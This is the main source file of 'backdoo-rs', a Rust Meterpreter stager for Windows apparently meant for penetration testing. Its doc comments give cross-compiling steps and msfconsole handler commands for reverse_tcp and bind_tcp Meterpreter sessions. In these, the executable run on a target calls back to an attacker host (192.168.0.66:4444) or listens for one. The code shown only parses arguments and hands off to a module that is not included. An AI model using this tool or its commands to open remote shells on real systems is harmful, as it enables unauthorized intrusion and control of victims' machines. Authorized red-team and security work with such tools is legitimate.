//!
//! backdoo-rs - A simple Meterpreter stager written in Rust  
//! Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>
//!
//! > "Launch the Polaris  
//! > The end doesn't scare us  
//! > When will this cease?  
//! > The warheads will all rust in peace"  
//! >  
//! > -- Megadeth, Rust in Peace... Polaris (1990)
//!
//! Minimalistic Rust implementation of the main staging protocols used by the Metasploit Framework.
//! Start an exploit/multi/handler instance on the attack box configured to handle one of the supported
//! payloads, run backdoo-rs.exe on the target Windows system, and enjoy your session!
//!
//! # See also
//! [letmein.py](https://github.com/0xdea/tactical-exploitation/blob/master/letmein.py)  
//! [letmein.ps1](https://github.com/0xdea/tactical-exploitation/blob/master/letmein.ps1)  
//! [letme.go](https://github.com/0xdea/tactical-exploitation/blob/master/letme.go)  
//!
//! # Cross-compiling
//! ```sh
//! [macOS example]
//! $ brew install mingw-w64
//! $ rustup target add x86_64-pc-windows-gnu
//! $ cargo build --release --target x86_64-pc-windows-gnu
//! ```
//!
//! # Usage
//! ```sh
//! C:\> backdoo-rs.exe [:port | host:port]
//! ```
//!
//! # Examples
//! Reverse shell:
//! ```sh
//! [on the attack box]
//! $ msfconsole
//! msf > use exploit/multi/handler
//! msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
//! msf > set LHOST 192.168.0.66
//! msf > exploit
//! [on the target box]
//! C:\> backdoo-rs.exe 192.168.0.66:4444
//! ```
//! 
//! Bind shell:
//! ```sh
//! [on the target box]
//! C:\> backdoo-rs.exe :4444
//! [on the attack box]
//! $ msfconsole
//! msf > use exploit/multi/handler
//! msf > set PAYLOAD windows/x64/meterpreter/bind_tcp
//! msf > set RHOST 192.168.0.20
//! msf > exploit
//! ```
//!
//! # Supported payloads
//! * `windows/x64/meterpreter/reverse_tcp`
//! * `windows/x64/meterpreter/bind_tcp`
//!
//! # Tested on
//! * Microsoft Windows 10
//! * Microsoft Windows 11
//! * Microsoft Windows Server 2016
//! * Microsoft Windows Server 2019
//! * Microsoft Windows Server 2022
//!

use std::env;
use std::process;

mod backdoo;
#[allow(clippy::wildcard_imports)]
use backdoo::*;

fn main() {
    println!("backdoo-rs - A simple Meterpreter stager written in Rust");
    println!("Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>");
    println!();

    // Parse command line arguments
    let args: Vec<String> = env::args().collect();
    let addr = match args.len() {
        1 => ":4444".to_string(),
        2 => args[1].clone(),
        _ => {
            usage(&args[0]);
            process::exit(1);
        }
    };

    if addr.starts_with('-') {
        usage(&args[0]);
        process::exit(1);
    }

    // Let's do it
    match run(&addr) {
        Ok(()) => (),
        Err(err) => {
            eprintln!("[!] Error: {err}");
            process::exit(1);
        }
    }
}

/// Print usage information
fn usage(prog: &str) {
    println!("Usage:");
    println!("{prog} [:port | host:port]");
    println!("\nExamples:");
    println!("{prog} :4444");
    println!("{prog} 192.168.0.66:4444");
}
